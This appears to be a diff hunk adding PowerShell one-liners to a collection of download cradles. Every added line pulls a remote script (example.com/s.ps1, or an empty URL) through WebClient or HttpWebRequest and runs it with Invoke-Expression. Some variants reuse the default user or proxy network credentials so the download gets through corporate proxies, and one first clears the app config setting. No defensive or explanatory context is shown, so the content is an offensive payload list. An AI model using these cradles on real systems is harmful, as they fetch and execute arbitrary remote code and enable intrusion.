@@ -31,3 +31,13 @@ $xmlhttp = New-Object -ComObject MSXML2.XMLHTTP
 $xmlhttp.open("GET", '', $false)
 $xmlhttp.send()
 Invoke-Expression $xmlhttp.responseText
+
+
+$wc=New-Object Net.WebClient;$wc.UseDefaultCredentials=$true;iex $wc.DownloadString("http:///.ps1")
+
+
+$req=[System.Net.HttpWebRequest]::Create("http://example.com/s.ps1");$res=$req.GetResponse();$sr=New-Object IO.StreamReader($res.GetResponseStream());iex $sr.ReadToEnd();$sr.Close()
+
+[System.AppDomain]::CurrentDomain.SetData("APP_CONFIG_FILE", $null);$wc=New-Object Net.WebClient;iex $wc.DownloadString("http://example.com/s.ps1")
+
+$wc=New-Object System.Net.WebClient;$wc.Proxy=[System.Net.WebRequest]::GetSystemWebProxy();$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;iex $wc.DownloadString("http://example.com/s.ps1")
